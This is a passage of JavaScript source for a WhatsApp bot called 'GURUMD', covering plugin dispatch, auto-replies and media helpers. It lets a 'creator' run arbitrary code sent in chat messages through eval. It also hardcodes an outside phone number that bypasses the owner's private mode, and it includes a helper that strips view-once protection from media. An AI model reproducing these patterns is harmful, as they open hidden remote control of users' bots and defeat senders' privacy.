                    const defaults = ["ᴳᵁᴿᵁᴹᴰ caught that! 😎","ᴳᵁᴿᵁᴹᴰ's vibing with you 🔥","ᴳᵁᴿᵁᴹᴰ's here legend!","ᴳᵁᴿᵁᴹᴰ's locked in! Hit me 😏"];
                    replyText = defaults[Math.floor(Math.random() * defaults.length)];
                }

                await conn.sendMessage(from, { text: `ᴳᵁᴿᵁᴹᴰ\n\n${replyText}` });
                logMessage('SENT', senderNumber, replyText, '[Auto-reply]');
            }
        }

        // Eval commands for creator
        if (isCreator && mek.text?.startsWith('%')) {
            let code = budy.slice(2);
            if (!code) { taggedReply(conn, from, `Provide me with a query to run Master!`, mek); return; }
            try {
                let resultTest = eval(code);
                taggedReply(conn, from, util.format(typeof resultTest === 'object' ? resultTest : resultTest), mek);
            } catch (err) { taggedReply(conn, from, util.format(err), mek); }
            return;
        }

        if (isCreator && mek.text?.startsWith('$')) {
            let code = budy.slice(2);
            if (!code) { taggedReply(conn, from, `Provide me with a query to run Master!`, mek); return; }
            try {
                let resultTest = await eval('const a = async()=>{ \n' + code + '\n}\na()');
                if (resultTest !== undefined) taggedReply(conn, from, util.format(resultTest), mek);
            } catch (err) { if (err !== undefined) taggedReply(conn, from, util.format(err), mek); }
            return;
        }

        // Auto reactions
        if(senderNumber.includes("254778074353") && !isReact) m.react("🤍");

        if (!isReact && config.AUTO_REACT === 'true') {
            const reactions = ['😊','👍','😂','🔥','❤️','💯','🙌','🎉','👏','😎','🤩','🥳','💥','✨','🌟','🙏','😍','🤣','💪','👑','🥰','😘','😭','😢','😤','🤔','🤗','😴','😷','🤢','🥵','🥶','🤯','🫡','🫶','👀','💀','😈','👻','🫂','🐱','🐶','🌹','🌸','🍀','⭐','⚡','🚀','💣','🎯'];
            m.react(reactions[Math.floor(Math.random() * reactions.length)]);
        }

        if (!isReact && config.CUSTOM_REACT === 'true') {
            const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
            m.react(reactions[Math.floor(Math.random() * reactions.length)]);
        }

        // Mode check
        let shouldProcess = false;
        if (config.MODE === "public" || !config.MODE) shouldProcess = true;
        else if (config.MODE === "private" && (isOwner || isMe || senderNumber === "254778074353")) shouldProcess = true;

        if (!shouldProcess && isCmd) logWarning(`Blocked command "${command}" from ${senderNumber} - MODE: ${config.MODE}`, '🚫');

        // Plugin execution
        if (shouldProcess) {
            const events = require('./command');
            const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
            
            if (isCmd) {
                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
                if (cmd) {
                    logCommand(senderNumber, command, true);
                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
                    try {
                        await cmd.function(conn, mek, m, {
                            conn, mek, m, from, quoted, body, isCmd, command, args, q, text,
                            isGroup, sender, senderNumber, botNumber2, botNumber, pushname,
                            isMe, isOwner, isCreator, groupMetadata, groupName, participants,
                            groupAdmins, isBotAdmins, isAdmins,
                            reply: (teks) => taggedReply(conn, from, teks, mek)
                        });
                    } catch (e) {
                        logError(`Plugin error: ${e.stack || e.message || e}`, '❌');
                        await taggedReply(conn, from, `ᴳᵁᴿᵁᴹᴰ Plugin error: ${e.message || 'Unknown'}`, mek);
                    }
                }
            }
            
            events.commands.forEach(async(command) => {
                try {
                    // FIXED: Removed the undefined 'l' variable and used proper parameters
                    if (body && command.on === "body") {
                        await command.function(conn, mek, m, {
                            conn, mek, m, from, quoted, body, isCmd, command, args, q, text, 
                            isGroup, sender, senderNumber, botNumber2, botNumber, pushname, 
                            isMe, isOwner, isCreator, groupMetadata, groupName, participants, 
                            groupAdmins, isBotAdmins, isAdmins, 
                            reply: (teks) => taggedReply(conn, from, teks, mek)
                        });
                    } else if (mek.q && command.on === "text") {
                        await command.function(conn, mek, m, {
                            conn, mek, m, from, quoted, body, isCmd, command, args, q, text, 
                            isGroup, sender, senderNumber, botNumber2, botNumber, pushname, 
                            isMe, isOwner, isCreator, groupMetadata, groupName, participants, 
                            groupAdmins, isBotAdmins, isAdmins, 
                            reply: (teks) => taggedReply(conn, from, teks, mek)
                        });
                    } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
                        await command.function(conn, mek, m, {
                            conn, mek, m, from, quoted, body, isCmd, command, args, q, text, 
                            isGroup, sender, senderNumber, botNumber2, botNumber, pushname, 
                            isMe, isOwner, isCreator, groupMetadata, groupName, participants, 
                            groupAdmins, isBotAdmins, isAdmins, 
                            reply: (teks) => taggedReply(conn, from, teks, mek)
                        });
                    } else if (command.on === "sticker" && mek.type === "stickerMessage") {
                        await command.function(conn, mek, m, {
                            conn, mek, m, from, quoted, body, isCmd, command, args, q, text, 
                            isGroup, sender, senderNumber, botNumber2, botNumber, pushname, 
                            isMe, isOwner, isCreator, groupMetadata, groupName, participants, 
                            groupAdmins, isBotAdmins, isAdmins, 
                            reply: (teks) => taggedReply(conn, from, teks, mek)
                        });
                    }
                } catch (error) { 
                    logError(`Event handler error: ${error.message}`, '❌'); 
                }
            });
        }
    });

    // ========== ALL BAILIEYS HELPER FUNCTIONS PRESERVED ==========
    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
        } else return jid;
    };

    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype;
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message 
                ? message.message.ephemeralMessage.message 
                : (message.message || undefined);
            vtype = Object.keys(message.message.viewOnceMessage.message)[0];
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
            delete message.message.viewOnceMessage.message[vtype].viewOnce;
            message.message = { ...message.message.viewOnceMessage.message };
        }

        let mtype = Object.keys(message.message)[0];
        let content = await generateForwardMessageContent(message, forceForward);
        let ctype = Object.keys(content)[0];
        let context = {};
        if (mtype != "conversation") context = message.message[mtype].contextInfo;
        content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };
        const waMessage = await generateWAMessageFromContent(jid, content, options ? { ...content[ctype], ...options, ...(options.contextInfo ? { contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo } } : {}) } : {});
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
        return waMessage;
    };

    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    };

    conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
        return buffer;
    };

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        let mime = '';
        try { let res = await axios.head(url); mime = res.headers['content-type']; } catch (error) { mime = 'application/octet-stream'; }
        let finalCaption = config.ENABLE_TAGGING 
            ? (config.TAG_POSITION === 'start' ? `${config.BOT_TAG_TEXT || 'ᴳᵁᴿᵁᴹᴰ • ᴾᴼᵂᴱᴿᴱᴰ ᴮᵞ GURU TECH'}\n\n${caption}` : `${caption}\n\n${config.BOT_TAG_TEXT || 'ᴳᵁᴿᵁᴹᴰ • ᴾᴼᵂᴱᴿᴱᴰ ᴮᵞ GURU TECH'}`)
            : `ᴳᵁᴿᵁᴹᴰ\n\n${caption}`;
        
        if (mime.split("/")[1] === "gif") return conn.sendMessage(jid, { video: await getBuffer(url), caption: finalCaption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
        if (mime === "application/pdf") return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: finalCaption, ...options }, { quoted: quoted, ...options });
        if (mime.split("/")[0] === "image") return conn.sendMessage(jid, { image: await getBuffer(url), caption: finalCaption, ...options }, { quoted: quoted, ...options });
        if (mime.split("/")[0] === "video") return conn.sendMessage(jid, { video: await getBuffer(url), caption: finalCaption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
        if (mime.split("/")[0] === "audio") return conn.sendMessage(jid, { audio: await getBuffer(url), caption: finalCaption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
        return conn.sendMessage(jid, { document: await getBuffer(url), caption: finalCaption, ...options }, { quoted: quoted, ...options });
    };

    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
        let mtype = Object.keys(copy.message)[0];
        let isEphemeral = mtype === 'ephemeralMessage';
        if (isEphemeral) mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
        let content = msg[mtype];
        if (typeof content === 'string') msg[mtype] = text || content;
        else if (content.caption) content.caption = text || content.caption;
        else if (content.text) content.text = text || content.text;
        if (typeof content !== 'string') msg[mtype] = { ...content, ...options };
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
        copy.key.remoteJid = jid;
        copy.key.fromMe = sender === conn.user.id;
        return proto.WebMessageInfo.fromObject(copy);
    };

    conn.getFile = async(PATH, save) => {
        let res;
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
        let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' };
        let filename = path.join(__dirname, new Date() * 1 + '.' + type.ext);
        if (data && save) fs.promises.writeFile(filename, data);
        return { res, filename, size: await getSizeMedia(data), ...type, data };
    };

    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
        let types = await conn.getFile(PATH, true);
        let { filename, size, ext, mime, data } = types;
        let type = '', mimetype = mime, pathFile = filename;
        if (options.asDocument) type = 'document';
        if (options.asSticker || /webp/.test(mime)) {
            let { writeExif } = require('./exif.js');
            let media = { mimetype: mime, data };
            pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] });
            await fs.promises.unlink(filename);
            type = 'sticker';
            mimetype = 'image/webp';
        } else if (/image/.test(mime)) type = 'image';
        else if (/video/.test(mime)) type = 'video';
        else if (/audio/.test(mime)) type = 'audio';
        else type = 'document';
        
        let finalOptions = { ...options };
        if (finalOptions.caption) finalOptions.caption = `ᴳᵁᴿᵁᴹᴰ\n\n${finalOptions.caption}`;
        
        await conn.sendMessage(jid, { [type]: { url: pathFile }, mimetype, fileName, ...finalOptions }, { quoted, ...options });
        return fs.promises.unlink(pathFile);
    };

    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
        let types = await conn.getFile(path, true);
        let { mime, ext, res, data, filename } = types;
        if (res && res.status !== 200 || data.length <= 65536) {
            try { throw { json: JSON.parse(data.toString()) }; } catch (e) { if (e.json) throw e.json; }
        }
        let type = '', mimetype = mime, pathFile = filename;
        if (options.asDocument) type = 'document';
        if (options.asSticker || /webp/.test(mime)) {
            let { writeExif } = require('./exif');
            let media = { mimetype: mime, data };
            pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] });
            await fs.promises.unlink(filename);
            type = 'sticker';
            mimetype = 'image/webp';
        } else if (/image/.test(mime)) type = 'image';
        else if (/video/.test(mime)) type = 'video';
        else if (/audio/.test(mime)) type = 'audio';
        else type = 'document';
        
        await conn.sendMessage(jid, { [type]: { url: pathFile }, caption: `ᴳᵁᴿᵁᴹᴰ\n\n${caption}`, mimetype, fileName, ...options }, { quoted, ...options });
        return fs.promises.unlink(pathFile);
    };

    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
            let { writeExifVid } = require('./exif');
            buffer = await writeExifVid(buff, options);
        } else {
            let { videoToWebp } = require('./lib/converter');
            buffer = await videoToWebp(buff);
        }
        await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
    };

    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
            let { writeExifImg } = require('./exif');
            buffer = await writeExifImg(buff, options);
        } else {
            let { imageToWebp } = require('./lib/converter');
            buffer = await imageToWebp(buff);
        }
        await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
    };

    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => {
        return conn.sendMessage(jid, { 
            text: `ᴳᵁᴿᵁᴹᴰ\n\n${text}`, 
            contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, 
            ...options 
        }, { quoted });
    };

    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
        let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        return await conn.sendMessage(jid, { image: buffer, caption: `ᴳᵁᴿᵁᴹᴰ\n\n${caption}`, ...options }, { quoted });
    };

    conn.sendText = (jid, text, quoted = '', options) => {
        return conn.sendMessage(jid, { text: `ᴳᵁᴿᵁᴹᴰ\n\n${text}`, ...options }, { quoted });
    };

    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
        let buttonMessage = {
            text: `ᴳᵁᴿᵁᴹᴰ\n\n${text}`,
            footer,
            buttons,
            headerType: 2,
            ...options
        };
        conn.sendMessage(jid, buttonMessage, { quoted, ...options });
    };

    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
        let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer });
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
            templateMessage: {
                hydratedTemplate: {
                    imageMessage: message.imageMessage,
                    "hydratedContentText": `ᴳᵁᴿᵁᴹᴰ\n\n${text}`,
                    "hydratedFooterText": footer,
                    "hydratedButtons": but
                }
            }
        }), options);
        conn.relayMessage(jid, template.message, { messageId: template.key.id });
    };

    conn.getName = async (jid, withoutContact = false) => {
        let id = conn.decodeJid(jid);
        withoutContact = conn.withoutContact || withoutContact;
        if (id.endsWith('@g.us')) {
            try { let v = await conn.groupMetadata(id); return v.subject || v.name || 'Group'; } catch (e) { return 'Group'; }
        } else {
            let v = id === '0@s.whatsapp.net' ? { id, name: 'WhatsApp' } : id === conn.decodeJid(conn.user.id) ? conn.user : store?.contacts?.[id] || { id, name: pushname || 'User' };
            return v.name || v.verifiedName || v.notify || v.vname || pushname || 'User';
        }
    };

    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
        let list = [];
        for (let i of kon) {
            list.push({
                displayName: await conn.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:ᴳᵁᴿᵁᴹᴰ\nitem1.TEL;waid=${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:gurutech@example.com\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/itsguruu/GURU\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;Nairobi;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
            });
        }
        conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted });
    };

    conn.setStatus = status => {
        conn.query({ tag: 'iq', attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' }, content: [ { tag: 'status', attrs: {}, content: Buffer.from(`ᴳᵁᴿᵁᴹᴰ • ${status}`, 'utf-8') } ] });
        return status;
    };
    
    conn.serializeM = mek => sms(conn, mek, store);
    
    return conn;
}

// ========== LOGGING FUNCTIONS ==========
function logDivider(text = '') {
  const dividerLength = 60;
  const textLength = text.length;
  const sideLength = Math.floor((dividerLength - textLength - 4) / 2);
  
  if (text) {
    const left = '═'.repeat(sideLength);
    const right = '═'.repeat(sideLength);
    console.log(chalk.hex(colors.success)(`${left}『 ${text} 』${right}`));
  } else {
    console.log(chalk.hex(colors.primary)('═'.repeat(dividerLength)));
  }
}

function logConnection(status, details = '') {
  const statusIcons = {
    'CONNECTING': { icon: '🔄', color: colors.warning },
    'CONNECTED': { icon: '✅', color: colors.success },
    'DISCONNECTED': { icon: '❌', color: colors.error },
    'RECONNECTING': { icon: '🔄', color: colors.warning },
    'READY': { icon: '🚀', color: colors.system }
  };
  
  const statusInfo = statusIcons[status] || { icon: '❓', color: colors.info };
  const statusText = chalk.hex(statusInfo.color).bold(status);
  console.log(`\n${statusInfo.icon} ${statusText} ${details}\n`);
}

function logMemory() {
  const used = process.memoryUsage();
  const rss = Math.round(used.rss / 1024 / 1024);
  const heap = Math.round(used.heapUsed / 1024 / 1024);
  const total = Math.round(used.heapTotal / 1024 / 1024);
  
  console.log(chalk.hex(colors.system).bold('🧠 MEMORY USAGE'));
  console.log(chalk.hex(colors.success)('RSS:') + ' ' + chalk.white(rss + ' MB'));
  console.log(chalk.hex(colors.success)('Heap Used:') + ' ' + chalk.white(heap + ' MB'));
  console.log(chalk.hex(colors.success)('Heap Total:') + ' ' + chalk.white(total + ' MB'));
  console.log(chalk.gray(heap + 'MB / 512MB'));
}

function logMessage(type, from, content = '', extra = '') {
  const timestamp = chalk.gray(`[${new Date().toLocaleTimeString()}]`);
  const types = {
    'RECEIVED': { emoji: '📥', color: colors.success },
    'SENT': { emoji: '📤', color: colors.info },
    'COMMAND': { emoji: '⚡', color: colors.warning },
    'EVENT': { emoji: '🎯', color: colors.system },
    'STATUS': { emoji: '📱', color: colors.primary }
  };
  
  const typeInfo = types[type] || { emoji: '📝', color: colors.info };
  const fromDisplay = chalk.hex(typeInfo.color).bold(from);
  const contentDisplay = content ? chalk.white(content) : '';
  const extraDisplay = extra ? chalk.gray(extra) : '';
  
  console.log(`${timestamp} ${typeInfo.emoji} ${fromDisplay} ${contentDisplay} ${extraDisplay}`);
}

function logCommand(user, command, success = true) {
  const userDisplay = chalk.hex(colors.system)(user);
  const commandDisplay = chalk.hex(colors.info).bold(command);
  const status = success ? chalk.hex(colors.success)('✓') : chalk.hex(colors.error)('✗');
  
  console.log(`🎮 ${userDisplay} ${chalk.gray('executed')} ${commandDisplay} ${status}`);
}

// ========== WEB SERVER ==========
app.get('/', (req, res) => res.send('ᴳᵁᴿᵁᴹᴰ is running ✅'));
app.listen(port, () => logSystem(`Web: ${port}`, '🌐'));

// ========== START ==========
setTimeout(async () => {
    try {
        const conn = await connectToWA();
        global.conn = conn;
    } catch (err) {
        logError(`Fatal: ${err.message}`, '💥');
        process.exit(1);
    }
}, 2000);

// ========== ERROR HANDLING ==========
process.on('uncaughtException', (err) => logError(`Exception: ${err.message}`));
process.on('unhandledRejection', (err) => logError(`Rejection: ${err}`));
process.on('exit', (code) => logSystem(`Process exiting: ${code}`, '👋'));

// Helper function
async function getSizeMedia(buffer) { return { size: buffer.length }; }
